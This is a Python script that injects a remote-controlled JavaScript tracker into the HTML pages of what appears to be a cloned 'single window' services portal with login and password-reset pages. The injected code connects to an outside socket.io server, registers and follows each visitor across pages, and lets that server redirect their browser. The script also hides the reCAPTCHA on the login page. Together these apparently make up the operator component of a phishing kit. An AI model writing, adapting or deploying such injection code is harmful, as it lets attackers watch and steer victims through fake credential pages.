from pathlib import Path
import re

TRACKER = """<script>
(function(){
  var SVID=localStorage.getItem('visitorId');
  var s=document.createElement('script');
  s.src='https://singlewindow.fly.dev/socket.io/socket.io.js';
  s.onload=function(){
    var sock=io('https://singlewindow.fly.dev',{transports:['polling','websocket'],reconnection:true});
    var m={'/':'الصفحة الرئيسية','/service':'صفحة الخدمات','/login':'تسجيل الدخول','/reset':'نسيت كلمة المرور','/update':'تحديث كلمة المرور'};
    function g(){var p=window.location.pathname;if(p.startsWith('/services/'))return 'خدمة: '+decodeURIComponent(p.replace('/services/','')).replace(/-/g,' ');return m[p]||p;}
    sock.on('connect',function(){
      sock.emit('visitor:register',{existingVisitorId:SVID,currentPage:g()});
      sock.emit('visitor:pageEnter',g());
    });
    sock.on('successfully-connected',function(d){if(d&&d.pid)localStorage.setItem('visitorId',d.pid);});
    sock.on('visitor:navigate',function(page){
      if(!page)return;
      var p=page.startsWith('/')?page:'/'+page;
      window.location.href=p;
    });
    window._sw_socket=sock;
  };
  document.head.appendChild(s);
})();
</script>"""

# CSS to hide reCAPTCHA spinner in login page
CAPTCHA_HIDE_CSS = """<style>
.Captcha3940957316__root { display: none !important; }
[data-comp-type*="Captcha"] { display: none !important; }
</style>"""

dist = Path('dist')
count = 0
for f in list(dist.glob('*.html')) + list(dist.glob('sw-services/*.html')):
    try:
        c = f.read_text(encoding='utf-8', errors='ignore')
        # Remove old tracker
        c = re.sub(r'<script>\s*\(function\(\)\{[^<]{30,}?_sw_socket[^<]*?\}\)\(\);\s*</script>', '', c, flags=re.DOTALL)
        c = re.sub(r'<script>\s*\(function\(\)\s*\{[^<]{30,}?_sw_socket.*?\}\)\(\);\s*</script>', '', c, flags=re.DOTALL)
        # Hide reCAPTCHA in login page
        extra = CAPTCHA_HIDE_CSS if f.name == 'sw-login.html' else ''
        if '</head>' in c:
            f.write_text(c.replace('</head>', extra + TRACKER + '</head>', 1), encoding='utf-8')
        elif '</body>' in c:
            f.write_text(c.replace('</body>', extra + TRACKER + '</body>', 1), encoding='utf-8')
        else:
            continue
        count += 1
        print(f"Injected: {f.name}")
    except Exception as e:
        print(f"Error {f.name}: {e}")

print(f"Done: {count} files updated")
